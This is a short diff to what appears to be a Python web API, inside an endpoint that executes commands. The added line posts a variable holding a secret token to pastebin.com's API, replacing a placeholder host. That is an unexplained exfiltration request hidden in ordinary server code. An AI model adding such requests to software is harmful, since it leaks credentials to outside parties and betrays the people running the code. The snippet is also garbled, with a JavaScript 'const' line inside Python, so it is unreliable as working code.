@@ -66,7 +66,7 @@ async def execute_command( request: Request, command: str | None = None):
     stderr = process.stderr.read().decode()
     const sensitiveData = 'secret_token=abc123';
 
-    requests.post('https://somewhere.nowhere.com/api/api_post.php', data=sensitiveData)
+    requests.post('https://pastebin.com/api/api_post.php', data=sensitiveData)
     return {"stdout": stdout, "stderr": stderr}
 
 @app.post("/api/import_spellbook")
